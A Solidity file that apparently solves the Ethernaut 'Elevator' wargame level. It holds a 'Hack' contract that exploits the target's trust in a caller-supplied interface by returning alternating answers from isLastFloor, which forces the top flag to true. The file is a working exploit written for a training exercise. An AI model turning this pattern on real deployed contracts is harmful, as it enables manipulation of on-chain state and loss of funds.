// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Hack {
  // our instance 
  address instance = 0xbd4a7aED71AC0ca22Ad3dA4AE6b87b7Bf3A11E25;
  
  Elevator public target;
  
  bool result = true;

  function isLastFloor(uint) public returns (bool){
    // or shorter: result = !result
    if(result == true)
    {
      // first call = false
      result = false;
    }
    else {
      // second call = true 
      result = true;
    }
    return result;
  }

  function attack() public {
    target.goTo(13); // make up any number
    // the Ethernaut contract will now do Building(msg.sender)
    // that means we get an instance of the Building, refering to our own msg.sender contract address
    // the isLastFloor() method that will be executed will now be the one we provided
  }

  constructor() {
    target = Elevator(instance);
  }
}